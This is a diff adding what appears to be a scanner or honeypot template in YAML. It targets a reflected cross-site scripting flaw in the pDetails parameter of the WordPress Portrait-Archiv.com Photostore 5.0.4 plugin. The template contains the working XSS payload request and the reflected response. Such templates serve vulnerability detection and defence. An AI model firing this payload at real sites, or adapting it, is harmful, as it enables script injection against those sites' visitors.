@@ -1,0 +1,28 @@
+id: wp-portrait-archiv-xss
+info:
+  name: WordPress Portrait-Archiv.com Photostore 5.0.4 - Reflected Cross Site Scripting
+  author: r3Y3r53
+  description: 'The ''pDetails'' GET parameter from the js/imageDetails.php was vulnerable
+    to an unauthenticated reflected XSS attack.
+
+    '
+  severity: medium
+  reference:
+  - https://wpscan.com/vulnerability/c6a8757e-41ef-4c20-8c7d-97b57d56fe0e
+  - https://wordpress.org/plugins/portrait-archiv-shop/
+  - https://packetstormsecurity.com/files/154343/
+  metadata:
+    verified: true
+    max-request: 1
+    publicwww-query: /wp-content/plugins/portrait-archiv-shop/
+  tags: wpscan,packetstorm,wordpress,wp-plugin,wp,portrait-archiv-shop,xss
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: </script><script>alert(document.location)</script>showImageDetail
